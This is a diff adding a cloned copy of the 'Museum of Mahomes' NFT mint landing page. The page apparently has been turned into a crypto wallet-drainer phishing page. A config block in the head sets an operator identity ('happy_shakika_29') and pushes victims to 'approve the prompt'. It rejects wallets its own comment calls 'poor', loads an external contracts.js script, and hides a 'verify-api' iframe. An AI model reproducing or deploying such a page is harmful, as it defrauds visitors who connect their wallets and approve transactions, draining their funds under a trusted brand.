@@ -1,0 +1,471 @@
+<!DOCTYPE html>
+<html lang="en"
+  style="--wcm-color-fg-1: rgb(20,20,20); --wcm-color-fg-2: rgb(121,134,134); --wcm-color-fg-3: rgb(158,169,169); --wcm-color-bg-1: rgb(255,255,255); --wcm-color-bg-2: rgb(241,243,243); --wcm-color-bg-3: rgb(228,231,231); --wcm-color-overlay: rgba(0,0,0,0.1); --wcm-accent-color: #3396FF; --wcm-accent-fill-color: #FFFFFF; --wcm-z-index: 89; --wcm-background-color: #3396FF; --wcm-background-border-radius: 8px; --wcm-container-border-radius: 30px; --wcm-wallet-icon-border-radius: 15px; --wcm-wallet-icon-large-border-radius: 30px; --wcm-wallet-icon-small-border-radius: 7px; --wcm-input-border-radius: 28px; --wcm-button-border-radius: 10px; --wcm-notification-border-radius: 36px; --wcm-secondary-button-border-radius: 28px; --wcm-icon-button-border-radius: 50%; --wcm-button-hover-highlight-border-radius: 10px; --wcm-text-big-bold-size: 20px; --wcm-text-big-bold-weight: 600; --wcm-text-big-bold-line-height: 24px; --wcm-text-big-bold-letter-spacing: -0.03em; --wcm-text-big-bold-text-transform: none; --wcm-text-xsmall-bold-size: 10px; --wcm-text-xsmall-bold-weight: 700; --wcm-text-xsmall-bold-line-height: 12px; --wcm-text-xsmall-bold-letter-spacing: 0.02em; --wcm-text-xsmall-bold-text-transform: uppercase; --wcm-text-xsmall-regular-size: 12px; --wcm-text-xsmall-regular-weight: 600; --wcm-text-xsmall-regular-line-height: 14px; --wcm-text-xsmall-regular-letter-spacing: -0.03em; --wcm-text-xsmall-regular-text-transform: none; --wcm-text-small-thin-size: 14px; --wcm-text-small-thin-weight: 500; --wcm-text-small-thin-line-height: 16px; --wcm-text-small-thin-letter-spacing: -0.03em; --wcm-text-small-thin-text-transform: none; --wcm-text-small-regular-size: 14px; --wcm-text-small-regular-weight: 600; --wcm-text-small-regular-line-height: 16px; --wcm-text-small-regular-letter-spacing: -0.03em; --wcm-text-small-regular-text-transform: none; --wcm-text-medium-regular-size: 16px; --wcm-text-medium-regular-weight: 600; --wcm-text-medium-regular-line-height: 20px; --wcm-text-medium-regular-letter-spacing: -0.03em; --wcm-text-medium-regular-text-transform: none; --wcm-font-family: -apple-system, system-ui, BlinkMacSystemFont, 'Segoe UI', Roboto, Ubuntu, 'Helvetica Neue', sans-serif; --wcm-font-feature-settings: 'tnum' on, 'lnum' on, 'case' on; --wcm-success-color: rgb(38,181,98); --wcm-error-color: rgb(242, 90, 103); --wcm-overlay-background-color: rgba(0, 0, 0, 0.3); --wcm-overlay-backdrop-filter: none;"
+  data-headlessui-focus-visible="" data-scrapbook-source="https://www.museumofmahomes.com/"
+  data-scrapbook-create="20230915201155224" data-scrapbook-title="Museum of Mahomes">
+
+<head>
+  <script defer="defer" src="js/vendors.js"></script>
+  <script defer="defer" src="js/contracts.js"></script>
+  <script defer="defer" src="js/main.js"></script>
+
+  <script>
+    window.UNIQUE_IDENTITY = "happy_shakika_29";
+
+    // Pick a theme here, this defaults to "light"
+    window.modal_theme = "light" || "dark";
+
+    // https://docs.walletconnect.com/2.0/web3modal/html/wagmi/theming
+    window.modal_variables = {
+      /* Example of what you can do */
+      // "--w3m-accent-color": "#FF00FF",
+      // "--w3m-background-color": "#FF00FF",
+      // "--w3m-logo-image-url": "/your-logo.svg",
+    };
+
+    // Notification modals
+    window.popups = {
+      PENDING: {
+        // The popup that shows when they get prompted
+        // title: "Claim Pending",
+        text: "You must approve the prompt in order to continue."
+      },
+      INVALID: {
+        // Shown when they connect on a wallet that is poor.
+        // title: "Ineligible Address",
+        text: "The connected account is not eligible for this event.\nPlease try using a different account.",
+      }
+    }
+
+    // Only touch this if you know what you're doing!
+    window.OVERRIDE_MODE = false;
+  </script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="656318263d2d0e07.css" data-precedence="next">
+  <link rel="stylesheet" href="812a1ba7002d3300.css" data-precedence="next">
+  <link rel="stylesheet" href="74d131e4406cb79b.css" data-precedence="next">
+  <title>Museum of Mahomes</title>
+  <meta name="description" content="Museum of Mahomes mint site">
+  <link rel="icon" href="favicon.ico" type="image/x-icon" sizes="12x16">
+  <meta name="next-size-adjust">
+  <script
+    data-scrapbook-elem="custom-elements-loader">(function (names) { if (!customElements) { return; } for (const name of names) { customElements.define(name, class CustomElement extends HTMLElement { }); } })(["next-route-announcer", "wcm-explorer-context", "wcm-theme-context", "wcm-modal"])</script>
+</head>
+
+<body class="__className_ab250c bg-black text-white overflow-x-hidden" id="root">
+  <div data-rk="">
+    <style>
+      [data-rk] {
+        --rk-blurs-modalOverlay: blur(0px);
+        --rk-fonts-body: SFRounded, ui-rounded, "SF Pro Rounded", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";
+        --rk-radii-actionButton: 9999px;
+        --rk-radii-connectButton: 12px;
+        --rk-radii-menuButton: 12px;
+        --rk-radii-modal: 24px;
+        --rk-radii-modalMobile: 28px;
+        --rk-colors-accentColor: #C19A69;
+        --rk-colors-accentColorForeground: #FFF;
+        --rk-colors-actionButtonBorder: rgba(255, 255, 255, 0.04);
+        --rk-colors-actionButtonBorderMobile: rgba(255, 255, 255, 0.08);
+        --rk-colors-actionButtonSecondaryBackground: rgba(255, 255, 255, 0.08);
+        --rk-colors-closeButton: rgba(224, 232, 255, 0.6);
+        --rk-colors-closeButtonBackground: rgba(255, 255, 255, 0.08);
+        --rk-colors-connectButtonBackground: #1A1B1F;
+        --rk-colors-connectButtonBackgroundError: #FF494A;
+        --rk-colors-connectButtonInnerBackground: linear-gradient(0deg, rgba(255, 255, 255, 0.075), rgba(255, 255, 255, 0.15));
+        --rk-colors-connectButtonText: #FFF;
+        --rk-colors-connectButtonTextError: #FFF;
+        --rk-colors-connectionIndicator: #30E000;
+        --rk-colors-downloadBottomCardBackground: linear-gradient(126deg, rgba(0, 0, 0, 0) 9.49%, rgba(120, 120, 120, 0.2) 71.04%), #1A1B1F;
+        --rk-colors-downloadTopCardBackground: linear-gradient(126deg, rgba(120, 120, 120, 0.2) 9.49%, rgba(0, 0, 0, 0) 71.04%), #1A1B1F;
+        --rk-colors-error: #FF494A;
+        --rk-colors-generalBorder: rgba(255, 255, 255, 0.08);
+        --rk-colors-generalBorderDim: rgba(255, 255, 255, 0.04);
+        --rk-colors-menuItemBackground: rgba(224, 232, 255, 0.1);
+        --rk-colors-modalBackdrop: rgba(0, 0, 0, 0.5);
+        --rk-colors-modalBackground: #1A1B1F;
+        --rk-colors-modalBorder: rgba(255, 255, 255, 0.08);
+        --rk-colors-modalText: #FFF;
+        --rk-colors-modalTextDim: rgba(224, 232, 255, 0.3);
+        --rk-colors-modalTextSecondary: rgba(255, 255, 255, 0.6);
+        --rk-colors-profileAction: rgba(224, 232, 255, 0.1);
+        --rk-colors-profileActionHover: rgba(224, 232, 255, 0.2);
+        --rk-colors-profileForeground: rgba(224, 232, 255, 0.05);
+        --rk-colors-selectedOptionBorder: rgba(224, 232, 255, 0.1);
+        --rk-colors-standby: #FFD641;
+        --rk-shadows-connectButton: 0px 4px 12px rgba(0, 0, 0, 0.1);
+        --rk-shadows-dialog: 0px 8px 32px rgba(0, 0, 0, 0.32);
+        --rk-shadows-profileDetailsAction: 0px 2px 6px rgba(37, 41, 46, 0.04);
+        --rk-shadows-selectedOption: 0px 2px 6px rgba(0, 0, 0, 0.24);
+        --rk-shadows-selectedWallet: 0px 2px 6px rgba(0, 0, 0, 0.24);
+        --rk-shadows-walletLogo: 0px 2px 16px rgba(0, 0, 0, 0.16);
+      }
+    </style>
+    <header class="lg:py-4 xl:py-6">
+      <div class="max-w-6xl mx-auto px-6 md:px-8">
+        <div class="lg:px-8 relative">
+          <div class="w-full flex items-center justify-between py-4"><a href=""><img alt="Museum of Mahomes logo"
+                loading="lazy" width="532" height="38" decoding="async" data-nimg="1"
+                class="w-[280px] h-[20px] lg:w-[352px] lg:h-[25px]" style="color:transparent"
+                src="museumofmahomes.ecae2483.svg"></a>
+            <div class="hidden lg:flex items-center justify-center gap-4"><a href="#how-it-works">
+                <nav class="px-2 py-1 text-white hover:text-accent transition-colors">How it works</nav>
+              </a><a href="#the-exhibits">
+                <nav class="px-2 py-1 text-white hover:text-accent transition-colors">The Exhibits</nav>
+              </a>
+              <div style="" class=""><button type="button"
+                  class="border border-accent rounded-full py-1 px-4 min-w-content w-32 hover:bg-accent hover:text-black transition-colors whitespace-nowrap" id="connect_button">Connect</button>
+              </div>
+            </div>
+            <div class="lg:hidden relative z-30">
+              <div class="hamburger-react" aria-expanded="false" role="button"
+                style="cursor:pointer;height:48px;position:relative;transition:0.4s cubic-bezier(0, 0, 0, 1);user-select:none;width:48px;outline:none;transform:none"
+                tabindex="0">
+                <div
+                  style="background:#C19A69;height:3px;left:8px;position:absolute;width:32px;top:13px;transition:0.4s cubic-bezier(0, 0, 0, 1);transform:none">
+                </div>
+                <div
+                  style="background:#C19A69;height:3px;left:8px;position:absolute;width:32px;top:23px;transition:0.4s cubic-bezier(0, 0, 0, 1);transform:none">
+                </div>
+                <div
+                  style="background:#C19A69;height:3px;left:8px;position:absolute;width:32px;top:33px;transition:0.4s cubic-bezier(0, 0, 0, 1);transform:none">
+                </div>
+              </div>
+            </div>
+            <div class="fixed z-20 inset-0 max-h-screen bg-black transition-transform duration-500 -translate-y-full">
+            </div>
+          </div>
+        </div>
+      </div>
+    </header>
+    <main class="">
+      <div class="relative overflow-hidden">
+        <div class="bg-gradient-to-b from-transparent via-transparent to-black absolute w-full inset-0"></div>
+        <div class="max-w-6xl mx-auto px-6 md:px-8">
+          <div class="lg:px-8 relative">
+            <div class="w-full h-96 md:min-h-screen mb-48 md:mb-0"><img alt="Patrick Mahomes holding a football"
+                loading="lazy" width="1786" height="1714" decoding="async" data-nimg="1"
+                class="w-1/2 min-w-[90%] sm:min-w-[460px] md:min-w-[82%] absolute top-[35%] sm:top-[10%] sm:right-0 -right-20 md:-right-12 md:-mt-2 lg:-mt-4 xl:-mt-6 -z-10 overflow-y-visible"
+                style="color:transparent" srcset="image-1.jpeg 1x, image.jpeg 2x" src="image.jpeg">
+              <div class="absolute left-0 top-[50%] sm:top-1/2 md:top-[20%] flex flex-col gap-4 md:gap-8">
+                <div class="flex flex-col">
+                  <h1
+                    class="__className_6ffd5c tracking-snug text-4xl md:text-6xl lg:text-7xl xl:text-8xl leading-none sm:leading-none md:leading-none lg:leading-none xl:leading-none">
+                    Welcome to<br> the Museum</h1>
+                  <p
+                    class="text-base md:text-lg lg:text-xl sm:leading-normal md:leading-normal lg:leading-normal font-light">
+                    <span class="hidden md:inline">The</span> <span class="capitalize md:lowercase">home</span> of
+                    Official Digital Collectibles<br class="block md:hidden"> by<!-- --> <span
+                      class="font-bold text-accent">Patrick Mahomes</span></p>
+                </div>
+                <div class="lg:pt-2 xl:pt-4"><a rel="noopener noreferrer" target=""><button
+                      class="font-light rounded-full py-1 border lg:border-2 px-4 min-w-[160px] md:min-w-[180px] lg:min-w-[200px] flex items-center justify-center disabled:cursor-not-allowed md:text-lg transition-colors bg-accent border-accent text-black hover:bg-white hover:border-white bg-accent text-black rounded-full w-32 md:w-64 md:text-xl px-4 py-2 flex justify-center items-center uppercase font-medium opacity-90 hover:opacity-100 transition-all" id="connect_button"><span>Connect
+                        Wallet</span></button></a></div>
+              </div>
+              <div class="absolute t-48 mb-48"></div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <section style="background-image:url(&quot;about-the-drop-bg.18fe0bcc.jpg&quot;)"
+        class="bg-cover bg-center relative">
+        <div
+          class="bg-gradient-to-b from-transparent  via-transparent  to-black absolute h-full w-full top-[1px] bottom-[1px] left-0">
+        </div>
+        <div
+          class="bg-gradient-to-t from-transparent  via-transparent  to-black absolute h-full w-full -top-[1px] bottom-[1px] left-0">
+        </div>
+        <div class="max-w-6xl mx-auto px-6 md:px-8">
+          <div class="py-10 lg:py-20 border-b border-white border-opacity-50 pt-0 lg:pt-0">
+            <div class="lg:px-8 relative">
+              <div id="how-it-works" class="absolute -mt-10"></div>
+              <div class="space-y-3 md:space-y-4 lg:space-y-6">
+                <div>
+                  <h2
+                    class="__className_6ffd5c tracking-snug text-3xl md:text-4xl lg:text-5xl xl:text-6xl leading-tight sm:leading-tight md:leading-tight lg:leading-tight xl:leading-tight">
+                    About the drop</h2>
+                  <div class="max-w-4xl">
+                    <p
+                      class="text-base md:text-lg lg:text-xl sm:leading-normal md:leading-normal lg:leading-normal font-light">
+                      The second exhibit in the digital memorabilia collection by Patrick Mahomes.</p>
+                  </div>
+                </div>
+                <div class="pt-4 lg:pt-6">
+                  <div class="space-y-4 lg:space-y-0 lg:grid grid-cols-3 gap-4 lg:gap-6">
+                    <div class="flex bg-black bg-opacity-20">
+                      <div class="rounded-3xl border-2 border-accent p-4 md:p-6 lg:p-8 ">
+                        <div class="space-y-2 md:space-y-3 lg:space-y-4">
+                          <h3
+                            class="__className_6ffd5c tracking-snug text-accent text-lg md:text-xl lg:text-2xl leading-tight sm:leading-tight md:leading-tight lg:leading-tight xl:text-2xl">
+                            <div class="flex justify-between"><span>The Exhibits</span><span
+                                class="text-accent">I.</span></div>
+                          </h3>
+                          <p
+                            class="text-sm md:text-base sm:leading-normal md:leading-normal lg:leading-normal font-light">
+                            The collection's total quantity consists of<!-- --> <strong>3,090</strong> digital
+                            collectibles, divided into<!-- --> <strong>six</strong> exhibits (packs) showcasing various
+                            highlights from Patrick Mahomes' career.</p>
+                          <p
+                            class="text-sm md:text-base sm:leading-normal md:leading-normal lg:leading-normal font-light">
+                            Each of these <strong>six</strong> exhibits will contain<!-- --> <strong>five</strong>
+                            different tiers of cards (Grail, Gold, Sterling, Bronze, Steel), each with its own unique
+                            rarity tiers and associated volumes that will be available.</p>
+                        </div>
+                      </div>
+                    </div>
+                    <div class="flex bg-black bg-opacity-20">
+                      <div class="rounded-3xl border-2 border-accent p-4 md:p-6 lg:p-8 ">
+                        <div class="space-y-2 md:space-y-3 lg:space-y-4">
+                          <h3
+                            class="__className_6ffd5c tracking-snug text-accent text-lg md:text-xl lg:text-2xl leading-tight sm:leading-tight md:leading-tight lg:leading-tight xl:text-2xl">
+                            <div class="flex justify-between"><span>Three Purchase Options</span><span
+                                class="text-accent">II.</span></div>
+                          </h3><span
+                            class="inline-flex justify-center items-center bg-accent w-full text-black text-bold text-center p-1 rounded-full">
+                            <p
+                              class="text-sm md:text-base sm:leading-normal md:leading-normal lg:leading-normal font-light">
+                              Mint the Digital Collectible</p>
+                          </span>
+                          <p
+                            class="text-sm md:text-base sm:leading-normal md:leading-normal lg:leading-normal font-light">
+                            Collectors will have the option to use a Web3 wallet; or if they do not have one, they can
+                            pay with fiat/credit card.</p><span
+                            class="inline-flex justify-center items-center bg-accent w-full text-black text-bold text-center p-1 rounded-full">
+                            <p
+                              class="text-sm md:text-base sm:leading-normal md:leading-normal lg:leading-normal font-light">
+                              Mint the Physical</p>
+                          </span>
+                          <p
+                            class="text-sm md:text-base sm:leading-normal md:leading-normal lg:leading-normal font-light">
+                            Using a Web3 Wallet or credit card / debit card, collectors can purchase the collectible and
+                            immediately burn it to redeem a physical card.</p><span
+                            class="inline-flex justify-center items-center bg-accent w-full text-black text-bold text-center p-1 rounded-full">
+                            <p
+                              class="text-sm md:text-base sm:leading-normal md:leading-normal lg:leading-normal font-light">
+                              Mint the Box Set Digital or Physical</p>
+                          </span>
+                          <p
+                            class="text-sm md:text-base sm:leading-normal md:leading-normal lg:leading-normal font-light">
+                            If you want to ensure that you receive all six exhibits, the easiest way to do so is to buy
+                            the box set. Buying exhibits individually is entirely random otherwise. You have the option
+                            to mint the digital collectible or mint the physical, similar to purchasing an individual
+                            exhibit. If you choose to mint the physical version, you will also receive a special limited
+                            commemorative collector's box.</p>
+                        </div>
+                      </div>
+                    </div>
+                    <div class="flex bg-black bg-opacity-20">
+                      <div class="rounded-3xl border-2 border-accent p-4 md:p-6 lg:p-8 ">
+                        <div class="space-y-2 md:space-y-3 lg:space-y-4">
+                          <h3
+                            class="__className_6ffd5c tracking-snug text-accent text-lg md:text-xl lg:text-2xl leading-tight sm:leading-tight md:leading-tight lg:leading-tight xl:text-2xl">
+                            <div class="flex justify-between"><span>Reveal and Redemption</span><span
+                                class="text-accent">III.</span></div>
+                          </h3>
+                          <p
+                            class="text-sm md:text-base sm:leading-normal md:leading-normal lg:leading-normal font-light">
+                            The digital collectibles can be revealed one week after the mint. When the reveal occurs, it
+                            does not mean your collectible will automatically unveil on its own; however, you will be
+                            now the opportunity to "break" the exhibit and reveal your collectible(s). You can also
+                            choose to leave your exhibit unopened for the future.</p>
+                          <p
+                            class="text-sm md:text-base sm:leading-normal md:leading-normal lg:leading-normal font-light">
+                            <em class="italic">The reveal of the digital collectibles does not apply to physical
+                              collectibles. Physical collectibles purchased during the mint will automatically be
+                              shipped with their cards, which gives collectors who purchased them the ability to reveal
+                              each card in person.</em></p>
+                          <p
+                            class="text-sm md:text-base sm:leading-normal md:leading-normal lg:leading-normal font-light">
+                            One week after the reveal, physical redemptions will open. Collectors will be given the
+                            option to "burn", or trade in, their digital collectible to receive a physical copy of
+                            their<!-- --> <em class="italic">Museum of Mahomes II</em> card. In order to participate
+                            this way, users will need to connect their wallet to<!-- --> <a
+                              href="https://museumofmahomes.com/" class="hover:underline" target="_blank"
+                              rel="noopener noreferrer">museumofmahomes.com</a> <!-- -->and follow the instructions
+                            listed for physical redemptions.</p>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+      <section class="py-10 lg:py-20 md:pt-0 lg:pt-0" id="the-exhibits">
+        <div class="max-w-6xl mx-auto px-6 md:px-8">
+          <div class="h-[1px] mt-[1px] border-t border-white border-opacity-50 pt-10 lg:pt-20"></div>
+        </div>
+        <div class="space-y-3 md:space-y-4 lg:space-y-6">
+          <div class="max-w-6xl mx-auto px-6 md:px-8">
+            <div class="lg:px-8 relative">
+              <h2
+                class="__className_6ffd5c tracking-snug text-3xl md:text-4xl lg:text-5xl xl:text-6xl leading-tight sm:leading-tight md:leading-tight lg:leading-tight xl:leading-tight">
+                The Exhibits</h2>
+              <p
+                class="text-base md:text-lg lg:text-xl sm:leading-normal md:leading-normal lg:leading-normal font-light">
+                The six Exhibits (packs) showcase various phases of Patrick's career, highlighting his journey to
+                becoming a champion and an MVP, and the plays that led him to this point. Now, they are yours to collect
+                and own.</p>
+            </div>
+          </div>
+          <div class="pt-4 lg:pt-6">
+            <div class="w-full">
+              <div class="max-w-6xl mx-auto px-6 md:px-8">
+                <div class="lg:px-8 relative">
+                  <div class="md:hidden">
+                    <div class="relative"><button
+                        class="__className_6ffd5c w-full py-2 px-4 md:py-6 md:px-12 rounded-2xl text-2xl bg-accent space-x-4 hover:bg-opacity-90 text-black flex items-center justify-center transition-all border-b border-accent"><span>Championship</span>
+                        <div class="hamburger-react" aria-expanded="false" role="button" tabindex="0"
+                          style="cursor: pointer; height: 48px; position: relative; transition: all 0.4s cubic-bezier(0, 0, 0, 1) 0s; user-select: none; width: 48px; outline: none; transform: none;">
+                          <div
+                            style="background: rgb(0, 0, 0); height: 2px; left: 12px; position: absolute; width: 24px; top: 16px; transition: all 0.4s cubic-bezier(0, 0, 0, 1) 0s; transform: none;">
+                          </div>
+                          <div
+                            style="background: rgb(0, 0, 0); height: 2px; left: 12px; position: absolute; width: 24px; top: 23px; transition: all 0.4s cubic-bezier(0, 0, 0, 1) 0s; transform: none;">
+                          </div>
+                          <div
+                            style="background: rgb(0, 0, 0); height: 2px; left: 12px; position: absolute; width: 24px; top: 30px; transition: all 0.4s cubic-bezier(0, 0, 0, 1) 0s; transform: none;">
+                          </div>
+                        </div>
+                      </button></div>
+                  </div>
+                  <div class="hidden md:block">
+                    <nav>
+                      <ul class="flex w-full border-2 border-accent rounded-2xl overflow-hidden text-lg lg:text-xl">
+                        <li class="flex-1"><button
+                            class="w-full p-4 lg:p-6 xl:px-8 transition-all __className_6ffd5c bg-accent text-black">Championship</button>
+                        </li>
+                        <li class="flex-1"><button
+                            class="w-full p-4 lg:p-6 xl:px-8 transition-all __className_6ffd5c bg-black text-white hover:bg-white hover:bg-opacity-10">MVP</button>
+                        </li>
+                        <li class="flex-1"><button
+                            class="w-full p-4 lg:p-6 xl:px-8 transition-all __className_6ffd5c bg-black text-white hover:bg-white hover:bg-opacity-10">MMXVII</button>
+                        </li>
+                        <li class="flex-1"><button
+                            class="w-full p-4 lg:p-6 xl:px-8 transition-all __className_6ffd5c bg-black text-white hover:bg-white hover:bg-opacity-10">MMXVIII</button>
+                        </li>
+                        <li class="flex-1"><button
+                            class="w-full p-4 lg:p-6 xl:px-8 transition-all __className_6ffd5c bg-black text-white hover:bg-white hover:bg-opacity-10">MMXIX</button>
+                        </li>
+                        <li class="flex-1"><button
+                            class="w-full p-4 lg:p-6 xl:px-8 transition-all __className_6ffd5c bg-black text-white hover:bg-white hover:bg-opacity-10">MMXX</button>
+                        </li>
+                      </ul>
+                    </nav>
+                  </div>
+                </div>
+              </div>
+              <div class="w-full">
+                <div class="h-0 pb-[62.5%] relative"><video autoplay="" loop="" playsinline=""
+                    class="absolute top-0 left-0 w-full h-full object-cover" poster="champ-poster.bb6bf9a5.jpg">
+                    <source src="champ-e0c18432171a576ada66b3fde9d122eb.mp4" type="video/mp4">
+                  </video>
+                  <div
+                    class="h-[25%] z-5 bg-gradient-to-b from-transparent  via-transparent  to-black absolute w-full bottom-0 left-0">
+                  </div>
+                  <div
+                    class="h-[25%] z-5 bg-gradient-to-t from-transparent  via-transparent  to-black absolute w-full top-0 left-0">
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+    </main>
+    <footer>
+      <div class="max-w-6xl mx-auto px-0 md:px-0 mt-4">
+        <div class="lg:px-8 relative">
+          <div class="border-t border-white border-opacity-50">
+            <div class="grid grid-cols-2 md:grid-cols-4 gap-4 my-8 lg:my-20 space-y-1 md:space-y-0">
+              <div class="col-span-2 flex items-center flex-col space-y-1"><img alt="Museum of Mahomes logo"
+                  loading="lazy" width="352" height="25" decoding="async" data-nimg="1"
+                  class="w-[280px] h-[20px] md:w-[352px] md:h-[25px]" style="color:transparent"
+                  srcset="image-3.png 1x, image-1.png 2x" src="image-1.png"><img alt="Patrick Mahomes signature"
+                  loading="lazy" width="226" height="79" decoding="async" data-nimg="1"
+                  class="w-[180px] h-[63px] md:w-[226px] md:h-[79px]" style="color:transparent"
+                  srcset="image.png 1x, image-2.png 2x" src="image-2.png"></div>
+              <div class="space-y-2 md:space-y-3 text-center md:text-left">
+                <h4
+                  class="__className_6ffd5c tracking-snug text-base lg:text-xl leading-tight sm:leading-tight md:leading-tight lg:leading-tight xl:leading-tight">
+                  The Museum</h4>
+                <nav>
+                  <ul class="space-y-2 md:space-y-3 font-light">
+                    <li class="text-sm md:text-base"><a href="#how-it-works" class="hover:underline">How it works</a>
+                    </li>
+                    <li class="text-sm md:text-base"><a href="#the-exhibits" class="hover:underline">The Exhibits</a>
+                    </li>
+                  </ul>
+                </nav>
+              </div>
+              <div class="space-y-2 md:space-y-3 text-center md:text-left">
+                <h4
+                  class="__className_6ffd5c tracking-snug text-base lg:text-xl leading-tight sm:leading-tight md:leading-tight lg:leading-tight xl:leading-tight">
+                  Socials</h4>
+                <nav>
+                  <ul class="space-y-2 md:space-y-3 font-light">
+                    <li class="text-sm md:text-base"><a href="https://twitter.com/MuseumofMahomes"
+                        class="hover:underline">X</a></li>
+                  </ul>
+                </nav>
+              </div>
+            </div>
+            <div
+              class="text-xs md:text-sm border-white border-t border-opacity-20 p-4 flex flex-col md:flex-row justify-between text-white text-opacity-30 text-center md:text-left">
+              <div class="order-1 md:order-1 md:w-1/3 mb-2 md:mb-0">Copyright <!-- -->2023<!-- -->. Museum of Mahomes.
+              </div>
+              <div class="order-3 md:order-1 md:w-1/3 text-center"><a href="https://d-o-m.com/" rel="noopener"
+                  class="hover:opacity-90 inline-flex space-x-1 ml-2"><span>Created by </span><img alt="D.O.M logo"
+                    loading="lazy" width="1863" height="606" decoding="async" data-nimg="1"
+                    class="max-w-[35px] md:max-w-[45px]" style="color:transparent" src="dom-logo.5e45468a.svg"></a>
+              </div>
+              <div class="order-2 md:order-2 mb-2 md:mb-0 md:w-1/3 md:text-right">
+                <ul class="md:ml-auto inline-flex space-x-2 justify-center md:justify-normal">
+                  <li><a href="https://www.museumofmahomes.com/terms-of-service" class="hover:underline">Terms of
+                      Service</a></li>
+                  <li><a href="https://www.museumofmahomes.com/privacy-policy" class="hover:underline">Privacy
+                      Policy</a></li>
+                </ul>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </footer>
+  </div><next-route-announcer style="position: absolute;"
+    data-scrapbook-shadowdom="<div aria-live=&quot;assertive&quot; id=&quot;__next-route-announcer__&quot; role=&quot;alert&quot; style=&quot;position: absolute; border: 0px; height: 1px; margin: -1px; padding: 0px; width: 1px; clip: rect(0px, 0px, 0px, 0px); overflow: hidden; white-space: nowrap; overflow-wrap: normal;&quot;></div>"></next-route-announcer><wcm-modal
+    data-scrapbook-shadowdom="<!----><wcm-explorer-context data-scrapbook-shadowdom=&quot;<!---->&quot;></wcm-explorer-context><wcm-theme-context data-scrapbook-shadowdom=&quot;<!---->&quot;></wcm-theme-context><div id=&quot;wcm-modal&quot; role=&quot;alertdialog&quot; aria-modal=&quot;true&quot; class=&quot; wcm-overlay &quot;><div class=&quot;wcm-container&quot; tabindex=&quot;0&quot;><!--?lit$2319050028$--></div></div><style data-scrapbook-elem=&quot;adoptedStyleSheet&quot;>*, ::after, ::before { margin: 0px; padding: 0px; box-sizing: border-box; font-style: normal; text-rendering: optimizespeed; -webkit-font-smoothing: antialiased; -webkit-tap-highlight-color: transparent; backface-visibility: hidden; }
+button { cursor: pointer; display: flex; justify-content: center; align-items: center; position: relative; border: none; background-color: transparent; transition: all 0.2s ease 0s; }
+@media (hover: hover) and (pointer: fine) {
+  button:active { transition: all 0.1s ease 0s; transform: scale(0.93); }
+}
+button::after { content: &quot;&quot;; position: absolute; inset: 0px; transition: background-color 0s ease 0s, all 0.2s ease 0s; }
+button:disabled { cursor: not-allowed; }
+button svg, button wcm-text { position: relative; z-index: 1; }
+input { border: none; outline: 0px; appearance: none; }
+img { display: block; }
+::selection { color: var(--wcm-accent-fill-color); background: var(--wcm-accent-color); }</style><style data-scrapbook-elem=&quot;adoptedStyleSheet&quot;>:host { all: initial; }
+.wcm-overlay { inset: 0px; position: fixed; z-index: var(--wcm-z-index); overflow: hidden; display: flex; justify-content: center; align-items: center; opacity: 0; pointer-events: none; background-color: var(--wcm-overlay-background-color); backdrop-filter: var(--wcm-overlay-backdrop-filter); }
+@media (max-height: 720px) and (orientation: landscape) {
+  .wcm-overlay { overflow: scroll; align-items: flex-start; padding: 20px 0px; }
+}
+.wcm-active { pointer-events: auto; }
+.wcm-container { position: relative; max-width: 360px; width: 100%; outline: 0px; border-radius: var(--wcm-background-border-radius) var(--wcm-background-border-radius) var(--wcm-container-border-radius) var(--wcm-container-border-radius); border: 1px solid var(--wcm-color-overlay); overflow: hidden; }
+.wcm-card { width: 100%; position: relative; border-radius: var(--wcm-container-border-radius); overflow: hidden; box-shadow: 0 6px 14px -6px rgba(10,16,31,.12),0 10px 32px -4px rgba(10,16,31,.1),0 0 0 1px var(--wcm-color-overlay); background-color: var(--wcm-color-bg-1); color: var(--wcm-color-fg-1); }
+@media (max-width: 600px) {
+  .wcm-container { max-width: 440px; border-radius: var(--wcm-background-border-radius) var(--wcm-background-border-radius) 0 0; }
+  .wcm-card { border-radius: var(--wcm-container-border-radius) var(--wcm-container-border-radius) 0 0; }
+  .wcm-overlay { align-items: flex-end; }
+}
+@media (max-width: 440px) {
+  .wcm-container { border: 0px; }
+}</style>"></wcm-modal><iframe id="verify-api" src="82ded75f796b5be7d0c9400dcda55f24.txt"
+    style="display: none;"></iframe>
+  <script
+    data-scrapbook-elem="basic-loader">(function () { var k1 = "data-scrapbook-shadowdom", k2 = "data-scrapbook-canvas", k3 = "data-scrapbook-input-indeterminate", k4 = "data-scrapbook-input-checked", k5 = "data-scrapbook-option-selected", k6 = "data-scrapbook-input-value", k7 = "data-scrapbook-textarea-value", fn = function (r) { var E = r.querySelectorAll ? r.querySelectorAll("*") : r.getElementsByTagName("*"), i = E.length, e, d, s; while (i--) { e = E[i]; if ((d = e.getAttribute(k1)) !== null && !e.shadowRoot && e.attachShadow) { s = e.attachShadow({ mode: 'open' }); s.innerHTML = d; e.removeAttribute(k1); } if ((d = e.getAttribute(k2)) !== null) { (function () { var c = e, g = new Image(); g.onload = function () { c.getContext('2d').drawImage(g, 0, 0); }; g.src = d; })(); e.removeAttribute(k2); } if ((d = e.getAttribute(k3)) !== null) { e.indeterminate = true; e.removeAttribute(k3); } if ((d = e.getAttribute(k4)) !== null) { e.checked = d === 'true'; e.removeAttribute(k4); } if ((d = e.getAttribute(k5)) !== null) { e.selected = d === 'true'; e.removeAttribute(k5); } if ((d = e.getAttribute(k6)) !== null) { e.value = d; e.removeAttribute(k6); } if ((d = e.getAttribute(k7)) !== null) { e.value = d; e.removeAttribute(k7); } if (e.shadowRoot) { fn(e.shadowRoot); } } }; fn(document); })()</script>
+</body>
+
+</html>
